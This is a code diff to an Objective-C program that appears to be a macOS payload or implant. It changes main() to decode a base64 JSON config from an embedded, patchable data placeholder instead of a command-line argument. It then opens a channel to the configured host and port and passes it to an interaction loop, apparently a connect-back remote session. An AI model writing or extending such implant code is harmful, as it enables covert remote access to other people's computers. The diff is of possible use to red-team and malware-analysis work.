@@ -28,6 +28,8 @@
 #import "channel.h"
 #import "utils.h"
 
+char data[1024] = ":data:string:";
+
 Channel *channel = [[Channel alloc] init];
 Utils *utils = [[Utils alloc] init];
 
@@ -79,30 +81,25 @@ void interactPipe(int channelPipe) {
     }
 }
 
-int main(int argc, const char *argv[]) {
+int main(void) {
     @autoreleasepool {
-        if (argc > 1) {
-            [utils redirectToNull];
+        Base64 *base64 = [[Base64 alloc] init];
 
-            Base64 *base64 = [[Base64 alloc] init];
+        NSString *inputData = [NSString stringWithFormat:@"%s", data];
+        NSString *decodedData = [base64 decodeBase64:inputData];
 
-            NSString *inputData = [NSString stringWithFormat:@"%s", argv[1]];
-            NSString *decodedData = [base64 decodeBase64:inputData];
+        NSData *jsonData = [decodedData dataUsingEncoding:NSUTF8StringEncoding];
+        NSMutableDictionary *jsonDict = [NSJSONSerialization JSONObjectWithData:jsonData options:0 error:NULL];
 
-            NSData *jsonData = [decodedData dataUsingEncoding:NSUTF8StringEncoding];
-            NSMutableDictionary *jsonDict = [NSJSONSerialization JSONObjectWithData:jsonData options:0 error:NULL];
+        NSString *host = [jsonDict objectForKey:@"host"];
+        NSString *port = [jsonDict objectForKey:@"port"];
 
-            NSString *host = [jsonDict objectForKey:@"host"];
-            NSString *port = [jsonDict objectForKey:@"port"];
-
-            int channelPipe = [channel openChannel:host withPort:[port integerValue]];
-            if (channelPipe < 0)
-                return -1;
-
-            interactPipe(channelPipe);
-            [channel closeChannel:channelPipe];
-        } else
+        int channelPipe = [channel openChannel:host withPort:[port integerValue]];
+        if (channelPipe < 0)
             return -1;
+
+        interactPipe(channelPipe);
+        [channel closeChannel:channelPipe];
     }
     return 0;
 }
